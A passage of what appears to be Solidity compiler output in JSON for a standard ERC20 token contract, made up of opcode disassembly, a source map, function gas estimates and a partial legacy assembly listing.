ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x46B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x23F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x213 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x510 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2A1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x26B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x558 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2D1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5FD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x383 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x337 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x614 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH2 0x3A6 CALLER DUP5 DUP5 PUSH2 0x69B JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3C7 DUP5 DUP5 DUP5 PUSH2 0x892 JUMP JUMPDEST PUSH2 0x460 DUP5 CALLER PUSH2 0x45B DUP6 PUSH1 0x1 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xA22 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x69B JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x506 CALLER DUP5 PUSH2 0x501 DUP6 PUSH1 0x1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xAAB SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x69B JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5F3 CALLER DUP5 PUSH2 0x5EE DUP6 PUSH1 0x1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xA22 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x69B JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x60A CALLER DUP5 DUP5 PUSH2 0x892 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x721 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB56 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x7A7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB34 PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH2 0x8E3 DUP2 PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xA22 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0x976 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xAAB SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 GT ISZERO PUSH2 0xA9A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP3 DUP5 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0xB29 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH2 0x7070 PUSH19 0x6F766520746F20746865207A65726F20616464 PUSH19 0x65737345524332303A20617070726F76652066 PUSH19 0x6F6D20746865207A65726F2061646472657373 LOG2 PUSH6 0x627A7A723158 KECCAK256 0xE9 0xE8 0xE3 DUP9 0xA7 0xCB 0xCD 0xD9 DUP8 JUMPI SELFDESTRUCT LT XOR 0xAE 0xD5 PUSH26 0xD1B3728701042977CEE25A9D4096DFC364736F6C634300051100 ORIGIN ",
							"sourceMap": "1256:6531:1:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1256:6531:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2536:148;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;2536:148:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;1559:91;;;:::i;:::-;;;;;;;;;;;;;;;;;;;3155:256;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;3155:256:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;3820:206;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;3820:206:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;1713:110;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;1713:110:1;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;4529:216;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;4529:216:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;2036:156;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;2036:156:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;2255:134;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;2255:134:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;2536:148;2601:4;2618:36;2627:10;2639:7;2648:5;2618:8;:36::i;:::-;2672:4;2665:11;;2536:148;;;;:::o;1559:91::-;1603:7;1630:12;;1623:19;;1559:91;:::o;3155:256::-;3244:4;3261:36;3271:6;3279:9;3290:6;3261:9;:36::i;:::-;3308:73;3317:6;3325:10;3337:43;3373:6;3337:11;:19;3349:6;3337:19;;;;;;;;;;;;;;;:31;3357:10;3337:31;;;;;;;;;;;;;;;;:35;;:43;;;;:::i;:::-;3308:8;:73::i;:::-;3399:4;3392:11;;3155:256;;;;;:::o;3820:206::-;3900:4;3917:79;3926:10;3938:7;3947:48;3984:10;3947:11;:23;3959:10;3947:23;;;;;;;;;;;;;;;:32;3971:7;3947:32;;;;;;;;;;;;;;;;:36;;:48;;;;:::i;:::-;3917:8;:79::i;:::-;4014:4;4007:11;;3820:206;;;;:::o;1713:110::-;1770:7;1797:9;:18;1807:7;1797:18;;;;;;;;;;;;;;;;1790:25;;1713:110;;;:::o;4529:216::-;4614:4;4631:84;4640:10;4652:7;4661:53;4698:15;4661:11;:23;4673:10;4661:23;;;;;;;;;;;;;;;:32;4685:7;4661:32;;;;;;;;;;;;;;;;:36;;:53;;;;:::i;:::-;4631:8;:84::i;:::-;4733:4;4726:11;;4529:216;;;;:::o;2036:156::-;2105:4;2122:40;2132:10;2144:9;2155:6;2122:9;:40::i;:::-;2180:4;2173:11;;2036:156;;;;:::o;2255:134::-;2327:7;2354:11;:18;2366:5;2354:18;;;;;;;;;;;;;;;:27;2373:7;2354:27;;;;;;;;;;;;;;;;2347:34;;2255:134;;;;:::o;7070:335::-;7180:1;7163:19;;:5;:19;;;;7155:68;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7261:1;7242:21;;:7;:21;;;;7234:68;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7345:5;7315:11;:18;7327:5;7315:18;;;;;;;;;;;;;;;:27;7334:7;7315:27;;;;;;;;;;;;;;;:35;;;;7382:7;7366:31;;7375:5;7366:31;;;7391:5;7366:31;;;;;;;;;;;;;;;;;;7070:335;;;:::o;5138:264::-;5248:29;5270:6;5248:9;:17;5258:6;5248:17;;;;;;;;;;;;;;;;:21;;:29;;;;:::i;:::-;5228:9;:17;5238:6;5228:17;;;;;;;;;;;;;;;:49;;;;5311:32;5336:6;5311:9;:20;5321:9;5311:20;;;;;;;;;;;;;;;;:24;;:32;;;;:::i;:::-;5288:9;:20;5298:9;5288:20;;;;;;;;;;;;;;;:55;;;;5376:9;5359:35;;5368:6;5359:35;;;5387:6;5359:35;;;;;;;;;;;;;;;;;;5138:264;;;:::o;1315:184:4:-;1373:7;1406:1;1401;:6;;1393:49;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1453:9;1469:1;1465;:5;1453:17;;1490:1;1483:8;;;1315:184;;;;:::o;859:181::-;917:7;937:9;953:1;949;:5;937:17;;978:1;973;:6;;965:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1031:1;1024:8;;;859:181;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "598000",
								"executionCost": "632",
								"totalCost": "598632"
							},
							"external": {
								"allowance(address,address)": "1387",
								"approve(address,uint256)": "infinite",
								"balanceOf(address)": "1196",
								"decreaseAllowance(address,uint256)": "infinite",
								"increaseAllowance(address,uint256)": "infinite",
								"totalSupply()": "1036",
								"transfer(address,uint256)": "infinite",
								"transferFrom(address,address,uint256)": "infinite"
							},
							"internal": {
								"_approve(address,address,uint256)": "infinite",
								"_burn(address,uint256)": "infinite",
								"_burnFrom(address,uint256)": "infinite",
								"_mint(address,uint256)": "infinite",
								"_transfer(address,address,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 1256,
									"end": 7787,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "MSTORE"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "POP"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "DUP1"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "CODECOPY"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 1256,
									"end": 7787,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820e9e8e388a7cbcdd98757ff1018aed579d1b3728701042977cee25a9d4096dfc364736f6c63430005110032",
									".code": [
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "MSTORE"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "POP"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "LT"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPI"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "SHR"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "DUP1"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "GT"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPI"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "DUP1"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "EQ"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPI"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "DUP1"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "A457C2D7"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "EQ"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPI"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "DUP1"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "EQ"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPI"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "DUP1"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "DD62ED3E"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "EQ"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPI"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMP"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPDEST"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "DUP1"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "95EA7B3"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "EQ"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPI"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "DUP1"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "18160DDD"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "EQ"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPI"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "DUP1"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "EQ"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPI"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "DUP1"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH",
											"value": "39509351"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "EQ"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "JUMPI"
										},
										{
											"begin": 1256,
											"end": 7787,
											"name": "tag",
											"value": "2"
										},
